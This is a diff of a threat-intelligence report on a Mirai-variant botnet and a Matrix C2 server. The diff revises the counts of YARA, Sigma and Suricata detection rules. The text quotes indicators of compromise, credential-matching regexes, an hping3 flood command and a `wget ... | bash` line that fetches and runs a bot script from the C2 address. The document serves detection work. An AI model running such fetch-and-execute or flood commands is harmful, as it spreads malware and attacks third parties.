@@ -90,7 +90,7 @@ This is a **single-operator** case tracked as **UTA-2026-014** *(an internal tra
 
 ### For Technical Teams
 
-The detection priorities, full rule corpus (29 rules: 10 YARA + 12 Sigma + 7 Suricata), and hunt strategies live in the [linked detection file](/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/), §10, and §14. The two highest-value targets:
+The detection priorities, full rule corpus (30 rules: 10 YARA + 10 Sigma + 10 Suricata), and hunt strategies live in the [linked detection file](/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/), §10, and §14. The two highest-value targets:
 
 - **Single-rule botnet fingerprint:** the four operator-bespoke constants (XOR keys `0x54` / `0x42` / `0x45`, charset `1gba4cdom53nhp12ei0kfj`, botnet ID `PandoraNet`, and the `/bin/busybox SORA` token) give a near-zero-FP YARA hit across all 11 Naku architectures. The length-prefixed-string CNC option-key modification is the highest-value Suricata target (defeats stock Mirai IDS; T1095 sub-technique gap means campaign-level authoring for now).
 - **Diagnostic infection signatures:** outbound TCP/23 to `165.227.175.161` (Naku CNC, hardcoded inline as `0xa1afe3a5`) and outbound TCP/1337 to `87.106.143.220` (Matrix C2). Separately, `web_scraper_bot.py` carries regex extractors for AWS keys (`AKIA[0-9A-Z]{16}`), GitHub PATs, Slack, and Stripe live keys, hunt any web property hit by a 50-500-request sub-60-second burst with `verify=False` SSL for credential exposure.
@@ -1065,11 +1065,11 @@ The following claims are NOT supported by current evidence and MUST NOT be made:
 ## 10. Risk & Detection
 {: .hl-tier-2}
 
-Detection coverage for this campaign is published as a per-case detection file: [`/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/`](/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/). The file contains **29 rules** distributed across three rule classes:
+Detection coverage for this campaign is published as a per-case detection file: [`/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/`](/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/). The file contains **30 rules** distributed across three rule classes:
 
 - **10 YARA rules**: file-based detection for the Pandora-Mirai 11-architecture bot suite (operator-bespoke charset + XOR keys + Sora-fork token + `PandoraNet` botnet ID), the Matrix C2 Python framework (AI-Generated Code Signature anchors), `persistent_bot.sh` 5-vector persistence installer, AI-Generated Documentation Signature handoff documents, escalating-superlative naming pattern
-- **12 Sigma rules**: log-based detection for `wget http://87.106.143.220/bot.sh | bash` process trees, systemd unit file writes referencing `87.106.143.220`, cron entries writing to `/etc/cron.d/.cache_update`, JavaScript / Python framework invocations from non-end-user hosts, Discord bot API patterns, mass outbound TCP/23 + TCP/22 scanning bursts from IoT-class devices
-- **7 Suricata signatures**: network-based detection for the **operator-bespoke length-prefixed-string CNC option-key protocol modification** (highest defender-value rule), `hping3 --rand-source --data 65500` OVH-bypass attack pattern, CVE-2017-17215 + CVE-2014-8361 exploit signatures, JSON-over-TCP wire protocol on TCP/1337, DNS / NTP / memcached / SSDP amplification reflection bursts, scapy-detected raw-socket activity
+- **10 Sigma rules**: log-based detection for `wget http://87.106.143.220/bot.sh | bash` process trees, systemd unit file writes referencing `87.106.143.220`, cron entries writing to `/etc/cron.d/.cache_update`, JavaScript / Python framework invocations from non-end-user hosts, Discord bot API patterns, mass outbound TCP/23 + TCP/22 scanning bursts from IoT-class devices
+- **10 Suricata signatures**: network-based detection for the **operator-bespoke length-prefixed-string CNC option-key protocol modification** (highest defender-value rule), `hping3 --rand-source --data 65500` OVH-bypass attack pattern, CVE-2017-17215 + CVE-2014-8361 exploit signatures, JSON-over-TCP wire protocol on TCP/1337, DNS / NTP / memcached / SSDP amplification reflection bursts, scapy-detected raw-socket activity
 
 **Highest-value detection authoring targets (priority order):**
 
